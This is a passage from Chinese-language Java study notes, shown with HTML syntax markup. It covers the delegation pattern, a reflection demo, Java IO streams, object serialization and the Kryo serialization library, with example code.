Java虚拟机生成的，由它来获悉整个类的结构信息。</p></li><li><p>Java中的<code>委派模式（Delegation Pattern）</code>是一种设计模式，它允许一个对象（委派对象）将特定的任务或责任委托给另一个对象来执行，而不是自己执行。在委派模式中，委派对象负责将任务分派给其他对象，这些被分派的对象通常被称为委派对象的代理或助手。</p><p>委派模式有助于降低代码的复杂性，提高代码的可维护性和可扩展性，因为它将不同的责任分离到不同的对象中，使每个对象只需要关注自己的特定任务。委派模式通常用于以下情况：</p><ol type="1"><li><p><strong>任务分配：</strong>当一个对象需要执行多个任务，而这些任务可以被不同的对象处理时，委派模式可以用于将任务分派给合适的对象。</p></li><li><p><strong>复杂性管理：</strong>当一个对象的职责变得过于复杂，难以维护时，委派模式可以用于将职责分解到多个对象中，使代码更清晰。</p></li><li><p><strong>策略模式：</strong>委派模式可以与策略模式结合使用，允许对象在运行时选择不同的算法或策略来完成任务。</p></li></ol><p>在Java中，委派模式的实现通常包括以下组成部分：</p><ol type="1"><li><p><strong>委派对象（Delegator）：</strong>负责接收任务并将其委派给具体的实现对象。</p></li><li><p><strong>具体实现对象（Delegate）：</strong>真正执行任务的对象，它们实现了特定的接口或抽象类，以便能够被委派对象调用。</p></li><li><p><strong>接口或抽象类（Delegate Interface/AbstractClass）：</strong>描述了具体实现对象必须实现的方法，以确保它们具有一致的接口。</p></li></ol><p>以下是一个简单的Java委派模式示例：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 委派对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Delegator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Delegate</span> delegate<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Delegator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        delegate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDelegateA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 默认使用具体实现对象A</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        delegate<span class="token punctuation">.</span><span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDelegate</span><span class="token punctuation">(</span><span class="token class-name">Delegate</span> newDelegate<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        delegate <span class="token operator">=</span> newDelegate<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 接口</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 具体实现对象A</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteDelegateA</span> <span class="token keyword">implements</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Delegate A is handling the task."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 具体实现对象B</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteDelegateB</span> <span class="token keyword">implements</span> <span class="token class-name">Delegate</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Delegate B is handling the task."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在上述示例中，<code>Delegator</code>是委派对象，它将任务委派给具体的实现对象（<code>ConcreteDelegateA</code>或 <code>ConcreteDelegateB</code>）。通过调用 <code>doTask</code>方法，<code>Delegator</code>将任务分派给当前的委派对象。你可以根据需要更改委派对象，以切换不同的具体实现。这种方式使得委派对象可以动态地选择不同的实现对象来执行任务。</p></li><li><p>委派模式的实现可以分为两种主要方式：本地实现和动态实现。</p><ol type="1"><li><p><strong>本地实现（Static Delegation）：</strong>在本地实现中，委派对象在<code>编译时</code>已经确定了委派关系，即在代码中显式指定了具体的实现对象。本地实现通常在代码中使用关键字或方法调用来选择实际执行任务的委派对象。这种方式通常是静态的，不支持在运行时更改委派对象。</p><p><strong>示例代码：</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 委派对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Delegator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Delegate</span> delegate<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Delegator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        delegate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDelegateA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 静态地选择实现对象A</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        delegate<span class="token punctuation">.</span><span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><strong>动态实现（Dynamic Delegation）：</strong>在动态实现中，委派对象在<code>运行时</code>根据条件或策略来选择委派给哪个具体的实现对象。这种方式通常使用条件语句、配置文件或其他运行时信息来确定委派关系，因此更加灵活，支持在运行时动态更改委派对象。</p><p><strong>示例代码：</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// 委派对象</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Delegator</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">Delegate</span> delegate<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 在运行时根据条件选择委派对象</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>someCondition<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            delegate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDelegateA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            delegate <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteDelegateB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        delegate<span class="token punctuation">.</span><span class="token function">doTask</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><p>动态实现允许你根据不同的条件或情况选择不同的实现对象，因此更加灵活。本地实现通常在编译时确定委派关系，因此更加静态和固定。你可以根据具体的需求选择使用哪种实现方式。</p></li><li><p>Java反射demo</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAge</span><span class="token punctuation">(</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">privateMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"私有方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchMethodException</span><span class="token punctuation">,</span>            <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InvocationTargetException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">NoSuchFieldException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 获取 Person 类的 Class 对象</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> personClass <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.github.paicoding.forum.test.javabetter.importance.Person"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取并打印类名</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"类名: "</span> <span class="token operator">+</span> personClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取构造函数</span>        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> constructor <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 使用构造函数创建 Person 对象实例</span>        <span class="token class-name">Object</span> personInstance <span class="token operator">=</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取并调用 getName 方法</span>        <span class="token class-name">Method</span> getNameMethod <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> getNameMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>personInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"名字: "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取并调用 setAge 方法</span>        <span class="token class-name">Method</span> setAgeMethod <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"setAge"</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        setAgeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>personInstance<span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取并访问 age 字段</span>        <span class="token class-name">Field</span> ageField <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"age"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ageField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> age <span class="token operator">=</span> ageField<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span>personInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"年纪: "</span> <span class="token operator">+</span> age<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 获取并调用私有方法</span>        <span class="token class-name">Method</span> privateMethod <span class="token operator">=</span> personClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"privateMethod"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        privateMethod<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        privateMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>personInstance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li></ol><h3 id="java-io">Java IO</h3><ol type="1"><li><p><code>流（Stream</code>），是一个抽象的概念，是指一连串的数据（<code>字符</code>或<code>字节</code>），是以先进先出的方式发送信息的通道。</p><p>当程序需要读取数据的时候，就会开启一个<code>通向数据源</code>的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个<code>通向目的地</code>的流。这时候你就可以想象数据好像在这其中“流”动一样。</p><ol type="1"><li>先进先出</li><li>顺序存取</li><li>只读或只写</li></ol></li><li><p>具体还要看<code>字符编码</code>，比如说在 UTF-8编码下，一个英文字母（不分大小写）为一个字节，一个中文汉字为<strong>三个</strong>字节；在Unicode编码中，一个英文字母为一个字节，一个中文汉字为<strong>两个</strong>字节。</p></li><li><p>字节流用来处理<strong>二进制文件</strong>，比如说图片啊、MP3啊、视频啊。</p><p>字符流用来处理<strong>文本文件</strong>，文本文件可以看作是一种特殊的二进制文件，只不过经过了编码，便于人们阅读。</p><p>换句话说：<strong>字节流可以处理一切文件，而字符流只能处理文本</strong></p></li><li><p><strong>核心</strong>的就是 4个抽象类：<code>InputStream</code>、<code>OutputStream</code>、<code>Reader</code>、<code>Writer</code></p></li><li><p>核心IO方法：<code>read</code> 和 <code>write</code></p></li><li><p>字节流本身没有<code>缓冲区</code>，缓冲字节流相对于字节流，<code>效率</code>提升非常高。而<code>字符流</code>本身就带有缓冲区，缓冲字符流相对于字符流效率提升就不是那么大了</p></li><li><p><code>Input</code>：将外部的数据读入<code>内存</code>，比如说把文件从<code>硬盘</code>读取到内存，从<code>网络</code>读取数据到内存等等</p><p><code>Output</code>：将内存中的数据写入到外部，比如说把数据从内存写入到文件，把数据从内存输出到网络</p></li><li><p>按照 IO 的操作对象来思考，IO就可以<strong>分类</strong>为：文件、数组、管道、基本数据类型、缓冲、打印、对象序列化/反序列化，以及转换等。</p></li><li><p>Java 中的管道和 <code>Unix/Linu</code>x中的<code>管道</code>不同，在 Unix/Linux中，<strong>不同的进程</strong>之间可以通过管道来通信，但 Java中，通信的双方必须在<strong>同一个 JVM</strong>中，管道为线程之间的通信提供了通信能力。</p></li><li><p><code>基本数据类型输入输出流</code>是一个字节流，该流不仅可以读写字节和字符，还可以读写基本数据类型。</p></li><li><p>了减少程序和硬盘的交互，提升程序的效率，就引入了<code>缓冲流</code>，也就是类名前缀带有<code>Buffer</code> 的那些，比如说BufferedInputStream、BufferedOutputStream、BufferedReader、BufferedWriter</p></li><li><p><code>打印</code>：PrintStream最终输出的是<code>字节数据</code>，而 PrintWriter 则是扩展了 Writer接口，所以它的 <code>print()/println()</code>方法最终输出的是字符数据。使用上几乎和 PrintStream 一模一样。</p></li><li><p><code>序列化</code>本质上是将一个 Java对象转成字节数组，然后可以将其保存到文件中，或者通过网络传输到远程。</p></li><li><p>InputStreamReader是从<code>字节流到字符流</code>的桥连接，它使用<code>指定的字符</code>集读取字节并将它们解码为字符</p><p>OutputStreamWriter将一个字符流的输出对象变为字节流的输出对象，是<code>字符流通向字节流</code>的桥梁。</p></li></ol><h4 id="序列流">序列流</h4><ol type="1"><li><p>在 Java 中，序列化通过实现 java.io.Serializable接口来实现，<strong>只有</strong>实现了 <code>Serializable</code>接口的对象才能被序列化。</p></li><li><p><code>java.io.ObjectOutputStream</code> 继承自 OutputStream类，因此可以将序列化后的字节序列写入到文件、网络等输出流中。</p><p>ObjectOutputStream 的构造方法：<code>ObjectOutputStream(OutputStream out)</code></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"file.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li><p>一个对象要想序列化，必须满足<strong>两个条件</strong>:</p><p>该类必须实现<code>java.io.Serializable</code>接口，否则会抛出<code>NotSerializableException</code> 。该类的所有字段都必须是可序列化的。如果一个字段不需要序列化，则需要使用<code>transient</code>关键字进行修饰。</p></li><li><p><code>writeObject (Object obj)</code> 方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> objectOutputStreamDemo <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// serialization</span>        <span class="token class-name">Person</span> person <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token string">"xx"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"logs/person.dat"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span>            oos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// deserialization</span>        <span class="token class-name">String</span> filename <span class="token operator">=</span> <span class="token string">"logs/person.dat"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">FileInputStream</span> fileIn <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>fileIn<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Object</span> obj <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Person</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token punctuation">)</span> obj<span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Deserialized Object:"</span> <span class="token operator">+</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> <span class="token operator">|</span> <span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Person</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> age<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></li><li><p><a href="https://github.com/EsotericSoftware/kryo">Kryo</a></p><ol type="1"><li><p>实际开发中，很少使用 <strong>JDK自带</strong>的序列化和反序列化</p></li><li><p>使用</p><ol type="1"><li><p>在 <code>pom.xml</code> 中引入依赖</p><pre class="language-none"><code class="language-none">&lt;!-- 引入 Kryo 序列化工具 --&gt;&lt;dependency&gt;     &lt;groupId&gt;com.esotericsoftware&lt;&#x2F;groupId&gt;     &lt;artifactId&gt;kryo&lt;&#x2F;artifactId&gt;     &lt;version&gt;5.4.0&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;</code></pre></li><li><p>第二步，创建一个 Kryo 对象，并使用 <code>register()</code>方法将对象进行注册。然后，使用 <code>writeObject()</code> 方法将 Java对象序列化为二进制流，再使用 <code>readObject()</code>方法将二进制流反序列化为 Java 对象。最后，输出反序列化后的 Java对象。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">KryoDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">FileNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Kryo</span> kryo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Kryo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kryo<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token class-name">KryoParam</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KryoParam</span> object <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">KryoParam</span><span class="token punctuation">(</span><span class="token string">"沉默王二"</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Output</span> output <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"logs/kryo.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        kryo<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>output<span class="token punctuation">,</span> object<span class="token punctuation">)</span><span class="token punctuation">;</span>        output<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Input</span> input <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Input</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"logs/kryo.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">KryoParam</span> object2 <span class="token operator">=</span> kryo<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token class-name">KryoParam</span><span class="token punctuation">.</span><span class="token keyword">class</span><span 